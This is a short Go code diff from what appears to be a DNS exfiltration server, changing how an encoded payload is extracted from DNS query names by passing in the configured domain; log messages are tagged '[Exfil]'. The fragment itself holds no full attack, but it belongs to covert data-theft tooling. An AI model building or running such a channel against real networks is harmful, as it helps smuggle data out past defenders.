@@ -262,7 +262,7 @@ func handleQuery(packet []byte, cfg Config, clientIP string) ([]byte, error) {
 				logf("[Exfil] Failed to parse EDNS metadata: %v", metaErr)
 			}
 		} else if meta != nil {
-			encoded, ok := extractExfilPayloadFromQName(q.Name)
+			encoded, ok := extractExfilPayloadFromQName(q.Name, cfg.Domain)
 			ack := false
 			if !ok {
 				if debugMode {
